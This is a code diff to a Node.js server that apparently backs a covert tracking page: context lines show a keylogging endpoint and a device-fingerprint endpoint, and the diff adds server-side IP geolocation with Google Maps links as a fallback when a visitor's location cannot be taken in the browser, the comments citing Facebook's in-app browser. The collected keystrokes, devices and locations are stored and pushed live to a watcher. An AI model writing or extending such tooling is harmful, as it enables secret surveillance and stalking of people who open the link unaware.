@@ -19,6 +19,7 @@ const fs = require('fs');
 const path = require('path');
 const os = require('os');
 const http = require('http');
+const https = require('https');
 const { WebSocketServer } = require('ws');
 const { spawn } = require('child_process');
 
@@ -163,14 +164,118 @@ app.post('/api/keylog', (req, res) => {
 });
 
 // ==========================================
+//  SERVER-SIDE IP GEOLOCATION
+// ==========================================
+function lookupIPLocation(ip) {
+    return new Promise((resolve) => {
+        const isLocal = !ip || ip === '::1' || ip === '127.0.0.1' || ip.startsWith('::ffff:127') || ip.startsWith('192.168') || ip.startsWith('10.');
+        
+        if (isLocal) {
+            // Laptop truy cập qua localhost → lấy public IP của server
+            https.get('https://ipapi.co/json/', { timeout: 8000, headers: { 'User-Agent': 'node-fetch/1.0' } }, (res) => {
+                let body = '';
+                res.on('data', chunk => body += chunk);
+                res.on('end', () => {
+                    try {
+                        const d = JSON.parse(body);
+                        if (d.latitude) {
+                            resolve({
+                                latitude: d.latitude, longitude: d.longitude,
+                                accuracy: 'IP (~1-50km)', city: d.city || '',
+                                region: d.region || '', country: d.country_name || '',
+                                isp: d.org || '', source: 'IP', lookup_by: 'server-self',
+                                google_maps: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
+                            });
+                        } else resolve(null);
+                    } catch(e) { resolve(null); }
+                });
+            }).on('error', () => resolve(null));
+            return;
+        }
+        // Lấy IPv4 thật nếu có IPv6-mapped
+        const cleanIP = ip.replace(/^::ffff:/, '');
+        const url = `https://ipapi.co/${cleanIP}/json/`;
+        const req = https.get(url, { timeout: 8000, headers: { 'User-Agent': 'node-fetch/1.0' } }, (res) => {
+            let body = '';
+            res.on('data', chunk => body += chunk);
+            res.on('end', () => {
+                try {
+                    const d = JSON.parse(body);
+                    if (d.latitude) {
+                        resolve({
+                            latitude: d.latitude,
+                            longitude: d.longitude,
+                            accuracy: 'IP (~1-50km)',
+                            city: d.city || '',
+                            region: d.region || '',
+                            country: d.country_name || '',
+                            isp: d.org || '',
+                            source: 'IP',
+                            lookup_by: 'server',
+                            google_maps: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
+                        });
+                    } else {
+                        // Fallback: ip-api.com
+                        lookupIPFallback(cleanIP).then(resolve);
+                    }
+                } catch(e) { resolve(null); }
+            });
+        });
+        req.on('error', () => lookupIPFallback(cleanIP).then(resolve));
+        req.on('timeout', () => { req.destroy(); resolve(null); });
+    });
+}
+
+function lookupIPFallback(ip) {
+    return new Promise((resolve) => {
+        const url = `http://ip-api.com/json/${ip}?fields=lat,lon,city,regionName,country,isp,status`;
+        http.get(url, { timeout: 6000 }, (res) => {
+            let body = '';
+            res.on('data', chunk => body += chunk);
+            res.on('end', () => {
+                try {
+                    const d = JSON.parse(body);
+                    if (d.lat && d.status === 'success') {
+                        resolve({
+                            latitude: d.lat, longitude: d.lon,
+                            accuracy: 'IP (~1-50km)',
+                            city: d.city || '', region: d.regionName || '',
+                            country: d.country || '', isp: d.isp || '',
+                            source: 'IP', lookup_by: 'server',
+                            google_maps: `https://www.google.com/maps?q=${d.lat},${d.lon}`
+                        });
+                    } else resolve(null);
+                } catch(e) { resolve(null); }
+            });
+        }).on('error', () => resolve(null)).on('timeout', () => resolve(null));
+    });
+}
+
+// ==========================================
 //  API: Fingerprint
 // ==========================================
-app.post('/api/fingerprint', (req, res) => {
+app.post('/api/fingerprint', async (req, res) => {
+    const clientIP = req.headers['x-forwarded-for']?.split(',')[0].trim()
+        || req.connection.remoteAddress
+        || req.ip;
+
     const fingerprint = {
         ...req.body,
-        server_ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip,
+        server_ip: clientIP,
         received_at: new Date().toISOString()
     };
+
+    // Nếu client không gửi được location (FB WebView bị chặn)
+    // → Server tự lookup IP
+    const clientLoc = fingerprint.location || {};
+    const hasValidLoc = clientLoc.latitude && !clientLoc.error;
+    if (!hasValidLoc) {
+        const serverLoc = await lookupIPLocation(clientIP);
+        if (serverLoc) {
+            fingerprint.location = serverLoc;
+            console.log(`🌐 Server IP lookup: ${clientIP} → ${serverLoc.city}, ${serverLoc.country}`);
+        }
+    }
 
     let data = readJson(FINGERPRINT_FILE);
     if (data.length > 500) data = data.slice(-250);
@@ -183,12 +288,10 @@ app.post('/api/fingerprint', (req, res) => {
     console.log('📲 THIẾT BỊ MỚI TRUY CẬP!');
     console.log(`📱 ${dev.device_name || 'N/A'} | ${dev.os || ''} ${dev.os_version || ''}`);
     console.log(`🌍 ${dev.browser || ''} v${dev.browser_version || ''}`);
-    if (loc.latitude) console.log(`📍 ${loc.latitude}, ${loc.longitude} (±${loc.accuracy})`);
+    if (loc.latitude) console.log(`📍 ${loc.latitude}, ${loc.longitude} | ${loc.city || ''}, ${loc.country || ''} [${loc.lookup_by || loc.source}]`);
     console.log('-'.repeat(50) + '\n');
 
-    // Broadcast
     broadcast({ type: 'new_fingerprint', data: fingerprint });
-
     res.json({ ok: true });
 });
 
